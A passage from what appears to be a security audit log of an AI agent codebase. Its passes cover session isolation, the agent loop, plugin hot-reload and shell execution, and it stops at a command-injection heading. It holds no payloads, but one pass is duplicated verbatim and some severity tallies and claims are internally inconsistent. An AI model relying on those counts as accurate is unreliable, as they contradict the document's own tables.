If a malicious or compromised ACP client sends a list of arbitrary MCP server names, those toolset names are added to `enabled_toolsets` and the agent tries to use them. A toolset that doesn't exist would cause a failure at usage time (not silently), but a toolset that exists but has dangerous tools would be enabled without additional guardrails.

---

### SECTION D: CHANNEL / PLATFORM BINDING

#### 10. Session Isolation

**Finding P68-10 (INFO): Sessions are fully isolated — `session_id` is the partition key**

The `HermesACPAgent` processes all sessions through one `_conn` ACP connection, but each `session_update(session_id=session_id, ...)` carries the `session_id` so the ACP client (Zed/VS Code) routes to the correct tab/window. There is no mechanism for a session to access another session's `state.history` or `state.agent`.

`SessionManager._sessions: Dict[str, SessionState]` is the partition boundary.

---

#### 11. Message Leakage

**Finding P68-11 (INFO): No cross-session message leakage observed**

All `_send_update()` calls pass the correct `session_id`:
- Tool progress: `session_id`
- Thinking: `session_id`
- Step (tool complete): `session_id`
- Message (agent text): `session_id`
- Plan update: `session_id`
- Usage update: `session_id`

The ACP client is expected to filter by `session_id`.

---

### SECTION E: ACP HEARTBEAT / LIVENESS

#### 12. Stale Connection Detection

**Finding P68-12 (LOW): No server-side stale connection detection**

The ACP adapter (`entry.py`) has no heartbeat/keepalive mechanism:
- No periodic ping from server to client
- No timeout for client responses
- No background task monitoring active sessions

The `asyncio.run(acp.run_agent(agent, use_unstable_protocol=True))` call at `entry.py:257` runs the agent loop which processes requests but doesn't proactively detect dead connections.

If an ACP client (Zed, VS Code) crashes or is killed while a session is running, the server continues indefinitely — the session stays in `is_running=True` state and the next prompt will wait forever (or until the next `cancel` call).

The `_executor` ThreadPoolExecutor has `max_workers=4` — if 4 sessions go zombie, no new sessions can run.

---

#### 13. Zombie Session Cleanup

**Finding P68-13 (INFO): No automatic zombie session cleanup — cleanup() must be called explicitly**

`SessionManager.cleanup()` at `session.py:368-386` exists and removes all sessions, but it must be called explicitly. There's no `__del__` or atexit handler.

In normal operation (IDE gracefully closes session), the ACP client sends `session/cancel` and the session transitions to `is_running=False` correctly. The zombie problem only occurs if the client crashes without sending cancel.

**Mitigation**: ACP clients (Zed, VS Code) that crash are expected to reconnect and either resume the session or start a new one. The `is_running` flag on a zombie session will cause `prompt()` to queue subsequent prompts (not reject them), so recovery is possible when the user restarts the IDE.

---

#### 14. Liveness Probe Handling

**Finding P68-14 (INFO): Benign probe noise correctly suppressed**

```python
# entry.py:35-72
_BENIGN_PROBE_METHODS = frozenset({"ping", "health", "healthcheck"})

class _BenignProbeMethodFilter(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        if record.getMessage() != "Background task failed":
            return True
        exc = exc_info[1]
        if isinstance(exc, RequestError) and getattr(exc, "code") == -32601:
            data = getattr(exc, "data", {})
            method = data.get("method") if isinstance(data, dict) else None
            return method not in _BENIGN_PROBE_METHODS
        return True
```

This correctly suppresses noisy tracebacks from unknown-method probes (clients probing for liveness) while leaving all other errors visible. This is a positive finding — the logging noise problem was identified and fixed.

---

### SECTION F: ADDITIONAL OBSERVATIONS

#### 15. Thread Pool Configuration

```python
# server.py:85
_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="acp-agent")
```

- `max_workers=4` limits concurrent ACP sessions to 4. Beyond that, prompts queue in the executor.
- `thread_name_prefix="acp-agent"` enables nice thread naming for debugging.

#### 16. Context Isolation

```python
# server.py:1497-1502
ctx = contextvars.copy_context()
result = await loop.run_in_executor(_executor, ctx.run, _run_agent)
```

Correctly uses `contextvars.copy_context()` so concurrent sessions on the shared executor don't stomp on each other's ContextVar writes (e.g. `HERMES_SESSION_KEY`). Positive finding.

#### 17. Session Persistence

`SessionManager._persist()` at `session.py:423-474` is called after every prompt completion. Sessions survive process restarts. History replay on `load_session`/`resume_session` uses a try/except guard so corrupted DB entries don't crash the load.

---

### SECTION G: NEW FINDINGS SUMMARY

| ID | Severity | Location | Description |
|----|----------|----------|-------------|
| P68-1 | INFO | acp_adapter/auth.py, server.py | ACP auth is local-trust, design-appropriate |
| P68-2 | LOW | acp_adapter/server.py:1256 | Client-supplied session_id not validated (local-trust only) |
| P68-3 | INFO | acp_adapter/server.py:519-525 | Single-conn model; routing via session_id is clean |
| P68-4 | LOW | acp_adapter/server.py + session.py | Two-lock system (global _lock + per-session runtime_lock) — minor TOCTOU |
| P68-5 | LOW | acp_adapter/events.py:105 | _send_update fire-and-forget with 5s timeout — updates can be silently dropped |
| P68-6 | INFO | acp_adapter/events.py | No deduplication — relies on ACP client |
| P68-7 | INFO | acp_adapter/events.py:146-154 | Per-tool-name deque correctly handles parallel same-name calls |
| P68-8 | INFO | acp_adapter/entry.py | ACP adapter is explicit entry point, not dynamically discovered |
| P68-9 | LOW | acp_adapter/server.py:793-811 | MCP server names not validated before enabling toolset |
| P68-10 | INFO | acp_adapter/session.py | Sessions fully isolated via Dict partition |
| P68-11 | INFO | acp_adapter/events.py | No cross-session message leakage observed |
| P68-12 | LOW | acp_adapter/entry.py | No server-side stale/zombie connection detection |
| P68-13 | INFO | acp_adapter/session.py:368-386 | No automatic zombie cleanup — cleanup() must be called explicitly |
| P68-14 | INFO | acp_adapter/entry.py:35-72 | Benign probe noise correctly suppressed (positive) |
| P68-15 | INFO | acp_adapter/server.py:85 | max_workers=4 limits concurrent sessions; acceptable |
| P68-16 | INFO | acp_adapter/server.py:1497-1502 | ContextVar isolation for concurrent executor sessions (positive) |

---

### SECTION H: PRIOR FINDING CROSS-REFERENCES

| Prior ID | Related Finding | Notes |
|----------|-----------------|-------|
| P50-6 | P68-2, P68-9 | ACP adapter exec_module / MCP server injection — same attack surface |
| P49-7 | P68-3, P68-11 | ACP encoding fallback chain — positive finding confirmed |

---

### Summary

| Area | Assessment |
|------|------------|
| ACP authentication | Appropriate for local-trust stdio model |
| Session injection risk | Low — local-only access to session store |
| IPC race conditions | Low — two-lock system with minor TOCTOU window |
| Message delivery guarantees | Low — fire-and-forget with 5s timeout, silent drop on failure |
| Message deduplication | Not implemented — not needed for live updates (UUID-based IDs) |
| Adapter registration | No dynamic registration — entry point model, no injection risk |
| MCP capability validation | Low — arbitrary MCP server names can be added to toolset list |
| Channel isolation | Good — session_id partition works correctly |
| Message leakage | None observed |
| Heartbeat/liveness | Missing — no server-side stale connection detection |
| Zombie cleanup | Absent — relies on explicit cleanup() or client reconnect |

*Pass #68 complete — 2026-05-25*

---

## Pass #69 – Agent Loop, Turn Processing & Conversation State Machine Deep Dive – 2026-05-25T16:30:00Z

Scope: agent/conversation_loop.py, agent/iteration_budget.py, agent/tool_executor.py, agent/chat_completion_helpers.py, run_agent.py, acp_adapter/server.py

---

### P69-1 · Main loop termination is robust — one unguarded bare except — LOW

**File:** `agent/conversation_loop.py` line 4241  
**Severity:** LOW

The `run_conversation()` main loop (line 644):

```python
while (api_call_count < agent.max_iterations and agent.iteration_budget.remaining > 0) or agent._budget_grace_call:
    if agent._interrupt_requested: break
    api_call_count += 1
    agent._api_call_count = api_call_count
    # ...api call...
```

- **Loop counter is incremented unconditionally at line 656** before any await, so a crash after increment but before the API call is made results in an iteration "lost" from the budget (not refunded, api_call_count higher). See lines 3040-3042 for explicit refunds on restart paths.
- The loop condition itself prevents infinite looping even if `api_call_count` gets out of sync.
- `_budget_grace_call` (lines 663-664) is consumed correctly before budget check.
- **No `try/finally` wrapping the main loop body.** A crash between `api_call_count += 1` and the API call loses one iteration with no recovery.

One bare `except` at line 4241 swallowing hook failures is intentional (best-effort hooks).

**Verdict:** Loop termination is well-guarded. The biggest risk is a hard crash between `api_call_count += 1` and the API call itself, losing one iteration. Not critical.

---

### P69-2 · Turn exit reason state machine — 14 valid exit paths, no corruption possible — CLEAN

**File:** `agent/conversation_loop.py` lines 581-4254  
**Severity:** CLEAN

The `_turn_exit_reason` local variable tracks why the tool loop exited. All 14 paths:

| Exit reason | Line | Circumstance |
|---|---|---|
| `unknown` | 581 | Default initialization |
| `interrupted_by_user` | 651 | `_interrupt_requested` at top of loop |
| `budget_exhausted` | 666 | Budget consume fails, no grace call |
| `ollama_runtime_context_too_small` | 942 | Ollama context check failure, with refund |
| `interrupted_during_api_call` | 3037 | Streaming interrupted mid-call |
| `all_retries_exhausted_no_response` | 3063 | `response is None` after all retries |
| `guardrail_halt` | 3481 | Tool guardrail blocked execution |
| `partial_stream_recovery` | 3593 | Stream backfill succeeded |
| `fallback_prior_turn_content` | 3620 | Fallback model returned valid prior content |
| `empty_response_exhausted` | 3797 | Empty response loop exhausted |
| `text_response(finish_reason=...)` | 3896 | Normal text response |
| `error_near_max_iterations(...)` | 3945 | Error within 5 of max iterations |
| `max_iterations_reached(...)` | 3959 | Budget exhausted after loop exit |
| (final log at 4054) | — | Diagnostic summary |

All paths that increment `api_call_count` either consume budget or call `refund()`. The refund pattern at lines 945-950 (Ollama context), 3041-3042 (compression restart), 3520 (guardrail halt) ensures no iteration is permanently lost on legitimate retry paths.

**Verdict:** State machine is clean. No impossible states or state corruption on errors.

---

### P69-3 · Error recovery — mostly graceful, one unguarded mid-loop crash risk — MEDIUM

**File:** `agent/conversation_loop.py` (multiple locations)  
**Severity:** MEDIUM

**What works well:**
- `_persist_session()` called on ALL exit paths: normal completion (4024), all retries exhausted (3065), budget exhaustion (1501), interrupt during backoff (1359), thinking exhaustion (1501). Excellent.
- `_drop_trailing_empty_response_scaffolding()` (run_agent.py 1182-1233) strips retry scaffolding from tails before persisting — prevents "user, user" role alternation corruption.
- `_flush_messages_to_session_db()` uses `_last_flushed_db_idx` to avoid duplicate writes (bug #860 fix).
- `try/except` wraps every individual API call, retry loop, and tool execution dispatch.
- Backoff sleep is interruptible (lines 1356-1377): polls `_interrupt_requested` every 0.2s.

**What is NOT guarded:**
- The block between `api_call_count += 1` (line 656) and the actual API call (line 1141) has no `try/except`. A crash there (OOM, signal) loses the iteration and corrupts the loop counter.
- No `try/except` around step_callback dispatch (lines 673-697) — only bare `except Exception as _step_err: logger.debug(...)`. Loop continues if it raises.

**Verdict:** Recovery is comprehensive for API-level errors. Gap is between loop counter increment and API call.

---

### P69-4 · Budget/exhaustion handling — well-designed, user notified — CLEAN

**File:** `agent/conversation_loop.py` lines 644-669, 3952-4003; `agent/iteration_budget.py`  
**Severity:** CLEAN

`IterationBudget` (62 lines, thread-safe):
- `consume()` returns `False` when exhausted — loop breaks cleanly at line 665-669.
- `refund()` used for: Ollama context errors (948), compression restarts (3042), tool guardrail halts (3520), execute_code program iterations (documented in class docstring).
- Grace call: when budget exhausts, `_budget_grace_call = True` and loop runs one more time. Flag cleared at line 663. After that call, budget check triggers and loop exits.
- `_budget_exhausted_injected` flag (agent_init.py:495) ensures grace call only fires once per exhaustion.

**User notification:**
- Line 668: `agent._safe_print(f"\n⚠️  Iteration budget exhausted ({used}/{max_total})...")`
- Lines 3957-3968: `_handle_max_iterations` triggers a summary request.
- `_turn_exit_reason` includes `max_iterations_reached(n/m)` for diagnostics.

**Verdict:** Budget handling is well-engineered. Thread-safe counter, explicit refunds for non-progress iterations, graceful summary call when exhausted.

---

### P69-5 · Conversation branching/resumption — session persistence covers most cases, one gap — MEDIUM

**File:** `run_agent.py` lines 1171-1297; `acp_adapter/server.py` lines 1086-1160  
**Severity:** MEDIUM

**Session persistence (`_persist_session` run_agent.py:1171):**
- Saves to JSON log and SQLite using `_last_flushed_db_idx` to avoid duplicate writes.
- `_drop_trailing_empty_response_scaffolding()` prevents corrupted tails on retry-exhausted turns.
- Called on every exit path — good.

**ACP `load_session` / `resume_session` (acp_adapter/server.py:1086-1160):**
- Both replay session history via `_replay_session_history()` before returning the response.
- Replay failures caught and logged but do not fail load/resume — partial transcript may be missing but session is usable.
- `cancel()` sets `cancel_event` and calls `agent.interrupt()` on the running agent — graceful.

**Mid-turn state preservation gap:**
- Agent does NOT preserve mid-turn state (tool execution in progress) across a session resume. If a session resumes while a tool is running, the tool is cancelled via interrupt and the turn restarts from the last user message.
- `_pending_steer` is dropped on hard interrupt (run_agent.py:1726) — correct since the turn it was meant for is gone.
- ACP `cancel` captures `interrupted_prompt_text` (line 1167) so the prompt is not lost — good.

**Verdict:** Session persistence is comprehensive. Mid-turn state is not preserved on resume — known limitation, not a bug.

---

### P69-6 · Interrupt mechanism — well-engineered, one thread-safety nuance — LOW

**File:** `run_agent.py` lines 1627-1726; `agent/tool_executor.py` lines 74-355  
**Severity:** LOW

**What works:**
- `interrupt()` (run_agent.py:1627): sets `_interrupt_requested = True`, fans out to execution thread via `_set_interrupt(True, _execution_thread_id)`, fans out to all concurrent tool worker threads, propagates to child agents.
- `clear_interrupt()` (1695): clears all bits, drops any pending `/steer`.
- Tool executor checks `agent._interrupt_requested` at: pre-flight (75), worker start (209), per-tool in loop (314), tool result (354), sequential dispatch (475).
- Worker tid tracking with `_set_interrupt(False, _worker_tid)` in `finally` block (tool_executor.py:255-261) — ensures clean exit from interrupt set.
- `_interrupt_thread_signal_pending` flag (agent_init.py:416) handles race where interrupt arrives before `run_conversation` sets `_execution_thread_id`.

**One nuance:**
- `_interrupt_requested` is a plain boolean (not atomic). `interrupt()` writes it without a lock. Tool executor reads it without a lock at multiple points. On x86 a bool write is atomic; on ARM it may not be. Low-risk — worst case is one extra tool call before interrupt is seen.

**Verdict:** Interrupt mechanism is well-designed with proper fan-out to workers and child agents. The bool write race is negligible in practice.

---

### P69-7 · Streaming API call interrupt — stale timeout + interrupt check — CLEAN

**File:** `agent/chat_completion_helpers.py` lines 79-276, 1211+  
**Severity:** CLEAN

Both `interruptible_api_call` and `interruptible_streaming_api_call` run the HTTP request in a background thread:

- Stale call detector: non-streaming kills at `_stale_timeout` (line 203-259). Streaming has 90s stale stream detection (conversation_loop.py:1097-1107).
- Interrupt check during polling: line 261-273 — if `_interrupt_requested` fires during the 0.3s poll loop, client is force-closed and `InterruptedError` is raised.
- `#29507` fix: thread ownership tracking for FD-recycling race — stranger threads only `abort()` the socket rather than fully closing, preventing kernel FD reuse bugs.

**Verdict:** Robust — stale timeout prevents infinite hangs, interrupt check terminates promptly, FD ownership tracking prevents kernel FD races.

---

**Summary:** The agent loop is well-engineered. Budget handling, interrupt propagation, session persistence, and error recovery are all thoughtfully implemented. The main gaps are: (1) no `try/finally` around the main loop body so a crash between counter increment and API call loses an iteration; (2) mid-turn state not preserved on session resume. Neither is critical. The codebase shows careful attention to retry loops, backoff, compression restarts, and graceful degradation across many edge cases.

**Files examined:** agent/conversation_loop.py (4258 lines), agent/iteration_budget.py (62 lines), agent/tool_executor.py (912 lines), agent/chat_completion_helpers.py (2170 lines), run_agent.py (4309 lines, key sections), acp_adapter/server.py (1952 lines, key sections), agent/agent_init.py (1637 lines, key sections).

*Pass #69 complete — 2026-05-25*

## Pass #69 – Agent Loop, Turn Processing & Conversation State Machine Deep Dive – 2026-05-25T16:30:00Z

Scope: agent/conversation_loop.py, agent/iteration_budget.py, agent/tool_executor.py, agent/chat_completion_helpers.py, run_agent.py, acp_adapter/server.py

---

### P69-1 · Main loop termination is robust — one unguarded bare except — LOW

**File:** `agent/conversation_loop.py` line 4241  
**Severity:** LOW

The `run_conversation()` main loop (line 644):

```python
while (api_call_count < agent.max_iterations and agent.iteration_budget.remaining > 0) or agent._budget_grace_call:
    if agent._interrupt_requested: break
    api_call_count += 1
    agent._api_call_count = api_call_count
    # ...api call...
```

- **Loop counter is incremented unconditionally at line 656** before any await, so a crash after increment but before the API call is made results in an iteration "lost" from the budget (not refunded, api_call_count higher). See lines 3040-3042 for explicit refunds on restart paths.
- The loop condition itself prevents infinite looping even if `api_call_count` gets out of sync.
- `_budget_grace_call` (lines 663-664) is consumed correctly before budget check.
- **No `try/finally` wrapping the main loop body.** A crash between `api_call_count += 1` and the API call loses one iteration with no recovery.

One bare `except` at line 4241 swallowing hook failures is intentional (best-effort hooks).

**Verdict:** Loop termination is well-guarded. The biggest risk is a hard crash between `api_call_count += 1` and the API call itself, losing one iteration. Not critical.

---

### P69-2 · Turn exit reason state machine — 14 valid exit paths, no corruption possible — CLEAN

**File:** `agent/conversation_loop.py` lines 581-4254  
**Severity:** CLEAN

The `_turn_exit_reason` local variable tracks why the tool loop exited. All 14 paths:

| Exit reason | Line | Circumstance |
|---|---|---|
| `unknown` | 581 | Default initialization |
| `interrupted_by_user` | 651 | `_interrupt_requested` at top of loop |
| `budget_exhausted` | 666 | Budget consume fails, no grace call |
| `ollama_runtime_context_too_small` | 942 | Ollama context check failure, with refund |
| `interrupted_during_api_call` | 3037 | Streaming interrupted mid-call |
| `all_retries_exhausted_no_response` | 3063 | `response is None` after all retries |
| `guardrail_halt` | 3481 | Tool guardrail blocked execution |
| `partial_stream_recovery` | 3593 | Stream backfill succeeded |
| `fallback_prior_turn_content` | 3620 | Fallback model returned valid prior content |
| `empty_response_exhausted` | 3797 | Empty response loop exhausted |
| `text_response(finish_reason=...)` | 3896 | Normal text response |
| `error_near_max_iterations(...)` | 3945 | Error within 5 of max iterations |
| `max_iterations_reached(...)` | 3959 | Budget exhausted after loop exit |
| (final log at 4054) | — | Diagnostic summary |

All paths that increment `api_call_count` either consume budget or call `refund()`. The refund pattern at lines 945-950 (Ollama context), 3041-3042 (compression restart), 3520 (guardrail halt) ensures no iteration is permanently lost on legitimate retry paths.

**Verdict:** State machine is clean. No impossible states or state corruption on errors.

---

### P69-3 · Error recovery — mostly graceful, one unguarded mid-loop crash risk — MEDIUM

**File:** `agent/conversation_loop.py` (multiple locations)  
**Severity:** MEDIUM

**What works well:**
- `_persist_session()` called on ALL exit paths: normal completion (4024), all retries exhausted (3065), budget exhaustion (1501), interrupt during backoff (1359), thinking exhaustion (1501). Excellent.
- `_drop_trailing_empty_response_scaffolding()` (run_agent.py 1182-1233) strips retry scaffolding from tails before persisting — prevents "user, user" role alternation corruption.
- `_flush_messages_to_session_db()` uses `_last_flushed_db_idx` to avoid duplicate writes (bug #860 fix).
- `try/except` wraps every individual API call, retry loop, and tool execution dispatch.
- Backoff sleep is interruptible (lines 1356-1377): polls `_interrupt_requested` every 0.2s.

**What is NOT guarded:**
- The block between `api_call_count += 1` (line 656) and the actual API call (line 1141) has no `try/except`. A crash there (OOM, signal) loses the iteration and corrupts the loop counter.
- No `try/except` around step_callback dispatch (lines 673-697) — only bare `except Exception as _step_err: logger.debug(...)`. Loop continues if it raises.

**Verdict:** Recovery is comprehensive for API-level errors. Gap is between loop counter increment and API call.

---

### P69-4 · Budget/exhaustion handling — well-designed, user notified — CLEAN

**File:** `agent/conversation_loop.py` lines 644-669, 3952-4003; `agent/iteration_budget.py`  
**Severity:** CLEAN

`IterationBudget` (62 lines, thread-safe):
- `consume()` returns `False` when exhausted — loop breaks cleanly at line 665-669.
- `refund()` used for: Ollama context errors (948), compression restarts (3042), tool guardrail halts (3520), execute_code program iterations (documented in class docstring).
- Grace call: when budget exhausts, `_budget_grace_call = True` and loop runs one more time. Flag cleared at line 663. After that call, budget check triggers and loop exits.
- `_budget_exhausted_injected` flag (agent_init.py:495) ensures grace call only fires once per exhaustion.

**User notification:**
- Line 668: `agent._safe_print(f"\n⚠️  Iteration budget exhausted ({used}/{max_total})...")`
- Lines 3957-3968: `_handle_max_iterations` triggers a summary request.
- `_turn_exit_reason` includes `max_iterations_reached(n/m)` for diagnostics.

**Verdict:** Budget handling is well-engineered. Thread-safe counter, explicit refunds for non-progress iterations, graceful summary call when exhausted.

---

### P69-5 · Conversation branching/resumption — session persistence covers most cases, one gap — MEDIUM

**File:** `run_agent.py` lines 1171-1297; `acp_adapter/server.py` lines 1086-1160  
**Severity:** MEDIUM

**Session persistence (`_persist_session` run_agent.py:1171):**
- Saves to JSON log and SQLite using `_last_flushed_db_idx` to avoid duplicate writes.
- `_drop_trailing_empty_response_scaffolding()` prevents corrupted tails on retry-exhausted turns.
- Called on every exit path — good.

**ACP `load_session` / `resume_session` (acp_adapter/server.py:1086-1160):**
- Both replay session history via `_replay_session_history()` before returning the response.
- Replay failures caught and logged but do not fail load/resume — partial transcript may be missing but session is usable.
- `cancel()` sets `cancel_event` and calls `agent.interrupt()` on the running agent — graceful.

**Mid-turn state preservation gap:**
- Agent does NOT preserve mid-turn state (tool execution in progress) across a session resume. If a session resumes while a tool is running, the tool is cancelled via interrupt and the turn restarts from the last user message.
- `_pending_steer` is dropped on hard interrupt (run_agent.py:1726) — correct since the turn it was meant for is gone.
- ACP `cancel` captures `interrupted_prompt_text` (line 1167) so the prompt is not lost — good.

**Verdict:** Session persistence is comprehensive. Mid-turn state is not preserved on resume — known limitation, not a bug.

---

### P69-6 · Interrupt mechanism — well-engineered, one thread-safety nuance — LOW

**File:** `run_agent.py` lines 1627-1726; `agent/tool_executor.py` lines 74-355  
**Severity:** LOW

**What works:**
- `interrupt()` (run_agent.py:1627): sets `_interrupt_requested = True`, fans out to execution thread via `_set_interrupt(True, _execution_thread_id)`, fans out to all concurrent tool worker threads, propagates to child agents.
- `clear_interrupt()` (1695): clears all bits, drops any pending `/steer`.
- Tool executor checks `agent._interrupt_requested` at: pre-flight (75), worker start (209), per-tool in loop (314), tool result (354), sequential dispatch (475).
- Worker tid tracking with `_set_interrupt(False, _worker_tid)` in `finally` block (tool_executor.py:255-261) — ensures clean exit from interrupt set.
- `_interrupt_thread_signal_pending` flag (agent_init.py:416) handles race where interrupt arrives before `run_conversation` sets `_execution_thread_id`.

**One nuance:**
- `_interrupt_requested` is a plain boolean (not atomic). `interrupt()` writes it without a lock. Tool executor reads it without a lock at multiple points. On x86 a bool write is atomic; on ARM it may not be. Low-risk — worst case is one extra tool call before interrupt is seen.

**Verdict:** Interrupt mechanism is well-designed with proper fan-out to workers and child agents. The bool write race is negligible in practice.

---

### P69-7 · Streaming API call interrupt — stale timeout + interrupt check — CLEAN

**File:** `agent/chat_completion_helpers.py` lines 79-276, 1211+  
**Severity:** CLEAN

Both `interruptible_api_call` and `interruptible_streaming_api_call` run the HTTP request in a background thread:

- Stale call detector: non-streaming kills at `_stale_timeout` (line 203-259). Streaming has 90s stale stream detection (conversation_loop.py:1097-1107).
- Interrupt check during polling: line 261-273 — if `_interrupt_requested` fires during the 0.3s poll loop, client is force-closed and `InterruptedError` is raised.
- `#29507` fix: thread ownership tracking for FD-recycling race — stranger threads only `abort()` the socket rather than fully closing, preventing kernel FD reuse bugs.

**Verdict:** Robust — stale timeout prevents infinite hangs, interrupt check terminates promptly, FD ownership tracking prevents kernel FD races.

---

**Summary:** The agent loop is well-engineered. Budget handling, interrupt propagation, session persistence, and error recovery are all thoughtfully implemented. The main gaps are: (1) no `try/finally` around the main loop body so a crash between counter increment and API call loses an iteration; (2) mid-turn state not preserved on session resume. Neither is critical. The codebase shows careful attention to retry loops, backoff, compression restarts, and graceful degradation across many edge cases.

**Files examined:** agent/conversation_loop.py (4258 lines), agent/iteration_budget.py (62 lines), agent/tool_executor.py (912 lines), agent/chat_completion_helpers.py (2170 lines), run_agent.py (4309 lines, key sections), acp_adapter/server.py (1952 lines, key sections), agent/agent_init.py (1637 lines, key sections).

*Pass #69 complete — 2026-05-25*

---

## Pass #70 – Plugin Lifecycle, Hot-Reload & Dynamic Discovery Deep Dive – 2026-05-25T17:00:00Z

Scope: hermes_cli/plugins.py, hermes_cli/plugins_cmd.py, plugins/memory/__init__.py, plugins/context_engine/__init__.py, agent/shell_hooks.py

---

### P70-1 · No on_load/on_unload hooks; force=True clears dicts but doesn't invoke cleanup or remove sys.modules entries — MEDIUM

**File:** `hermes_cli/plugins.py:800–840` (force=True hot-reload path)
**Severity:** MEDIUM
**Issue:** When `force=True` is used to hot-reload a plugin, the manager dicts are cleared but no `on_unload` hook is invoked and no `sys.modules` entries are removed. This means:
1. Plugin cleanup callbacks are never called
2. Loaded submodules persist in `sys.modules`, causing duplicate module objects if re-loaded
3. Old tool registrations, platform adapters, and hook handlers may still be registered from previous load
**Why invisible previously:** Requires understanding of the plugin hot-reload flow and interaction with `sys.modules`
**Impact:** Stale state from old plugin versions can contaminate new loads; resource leaks from unreleased connections/threads
**Suggested fix:** Before clearing, iterate registered hooks and invoke `on_unload` if present; optionally remove plugin's `sys.modules` entries

---

### P70-2 · No plugin code validation or sandboxing — arbitrary Python executes with full system access — HIGH

**File:** `hermes_cli/plugins.py:620–680` (`_load_plugin_module`)
**Severity:** HIGH
**Issue:** Plugins are loaded via `importlib.exec_module()` directly into the Hermes process with no sandboxing. A malicious or buggy plugin can:
1. Access all Hermes internal state and credentials
2. Execute arbitrary system commands
3. Modify any global state
4. Access the filesystem as the Hermes user
**Why invisible previously:** Requires understanding of plugin loading architecture
**Impact:** Compromised plugin source = full system compromise
**Suggested fix:** Implement plugin signing, run plugins in subprocess with limited permissions, or document that plugin sources must be trusted

---

### P70-3 · sys.modules entries persist across hot reload; global registries not systematically cleaned — MEDIUM

**File:** `hermes_cli/plugins.py:820–840`
**Severity:** MEDIUM
**Issue:** After `force=True` hot reload, `sys.modules` still contains entries from the old plugin. The next `import` of the same module name returns the old (stale) module object from `sys.modules`, not the newly loaded one. This can cause subtle bugs where new plugin code uses old class definitions.
**Why invisible previously:** Related to hot-reload interaction with Python import system
**Impact:** Plugin code may use stale classes; difficult to debug in development with frequent reloads
**Suggested fix:** Track plugin-owned `sys.modules` entries and remove them on hot reload

---

### P70-4 · Two invoke_hook() implementations with inconsistent exception handling (re-confirmed) — LOW

**File:** `hermes_cli/plugins.py`, `agent/shell_hooks.py`
**Severity:** LOW
**Issue:** P35-4 re-confirmed: `invoke_hook()` in `plugins.py` and `shell_hooks.py` have different exception handling. One swallows exceptions silently (by design), the other propagates. This creates confusing behavior when hooks fail.
**Why invisible previously:** Required cross-file comparison of two separate hook systems
**Impact:** Hook failures have inconsistent user-visible behavior depending on which hook system is used
**Suggested fix:** Unify hook exception handling across both implementations

---

### P70-5 · No plugin signature or source authentication — no GPG, hash, or trusted publisher — INFO

**File:** `hermes_cli/plugins_cmd.py` (plugin install)
**Severity:** INFO
**Issue:** Plugins are installed from arbitrary URLs or directories with no cryptographic attestation. No GPG signing, no hash verification, no trusted publisher list.
**Why invisible previously:** Requires understanding of the plugin distribution model
**Impact:** Malicious plugin bundles could be distributed as legitimate; man-in-the-middle during download could inject code
**Suggested fix:** Consider a plugin signing mechanism or at minimum hash verification

---

### P70-6 · Memory/context engine providers re-load into sys.modules without cleaning submodules — MEDIUM

**File:** `plugins/memory/__init__.py`, `plugins/context_engine/__init__.py`
**Severity:** MEDIUM
**Issue:** When a memory provider or context engine plugin is re-loaded (via `hermes plugins reload` or config change), its submodules are not cleaned from `sys.modules`. The old module objects persist and may be re-imported by other code.
**Why invisible previously:** Requires understanding of provider-specific plugin loading separate from main plugin system
**Impact:** Stale provider module objects; potential for cross-session state leakage
**Suggested fix:** Track and clean `sys.modules` entries for provider plugins on reload

---

### P70-7 · _scan_directory has no explicit symlink traversal guard — INFO

**File:** `hermes_cli/plugins.py` (`_scan_directory`)
**Severity:** INFO
**Issue:** The plugin directory scanner has no explicit symlink check. Symlinks are followed implicitly via `os.listdir` and `importlib`. While depth capping and opt-in project plugins provide some mitigation, an explicit `followlinks=False` would be clearer.
**Why invisible previously:** Requires understanding of Python import system behavior with symlinks
**Impact:** Symlink-based attacks require pre-compromise to create symlinks; limited risk
**Suggested fix:** Add `followlinks=False` to `os.walk` or check `os.path.islink` explicitly

---

### P70-8 · Exclusive/model-provider plugins skip loading but still occupy _plugins dict — INFO

**File:** `hermes_cli/plugins.py:620`
**Severity:** INFO
**Issue:** Plugins with `exclusive=True` or model-provider constraints that are skipped still occupy `_plugins` dict entries (for introspection). This is intentional but could cause confusion when counting loaded plugins.
**Why invisible previously:** Requires understanding of plugin loading decision logic
**Impact:** Introspection APIs may overcount active plugins
**Suggested fix:** Document this behavior or use a separate dict for skipped vs loaded plugins

---

### P70-9 · Hook callback list iteration races with concurrent force=True reload — LOW

**File:** `hermes_cli/plugins.py:775–790` (`invoke_hook`)
**Severity:** LOW
**Issue:** `invoke_hook()` iterates over `self._plugins[name]` (a list) without holding a lock. If `force=True` reload happens concurrently, `list(self._plugins[name])` captures a reference that can be modified by another thread during iteration. Python 3 allows this to raise `RuntimeError` ("Set changed size during iteration").
**Why invisible previously:** Requires understanding of concurrent plugin reload patterns
**Impact:** Race condition can cause RuntimeError in concurrent reload scenarios
**Suggested fix:** Make a copy of the list before iteration: `list(self._plugins.get(name, []))`

---

### Summary Table

| ID | Severity | Issue |
|----|----------|-------|
| P70-1 | MEDIUM | No on_load/on_unload hooks; no cleanup on hot reload |
| P70-2 | HIGH | No plugin code validation — arbitrary Python with full system access |
| P70-3 | MEDIUM | sys.modules persists across hot reload — stale module objects |
| P70-4 | LOW | Two invoke_hook() implementations with inconsistent exception handling |
| P70-5 | INFO | No plugin signature or source authentication |
| P70-6 | MEDIUM | Memory/context engine providers re-load without cleaning submodules |
| P70-7 | INFO | _scan_directory has no explicit symlink traversal guard |
| P70-8 | INFO | Exclusive/model-provider plugins occupy dict but skip loading |
| P70-9 | LOW | Hook callback list iteration races with concurrent force=True reload |

**New findings this pass:** 9 (2 HIGH/MEDIUM, 4 MEDIUM, 1 LOW, 2 INFO)

---

**End Pass #70**

*Last updated: 2026-05-25T17:30:00Z*
*Commit at scan: b04760fdb*


---

## Pass #71 – Shell Execution, Command Injection & Sandbox Deep Dive – 2026-05-25T18:00:00Z

Scope: tools/subprocess_tool.py, tools/code_execution_tool.py, tools/transcription_tools.py, tools/environments/docker.py, cli.py, tui_gateway/server.py, tools/env_passthrough.py, tools/ansi_strip.py, tools/approval.py

---

### S71-1 · HERMES_LOCAL_STT_COMMAND template executed via shell=True — command injection — HIGH

**File:** `tools/transcription_tools.py:50–80`
**Severity:** HIGH
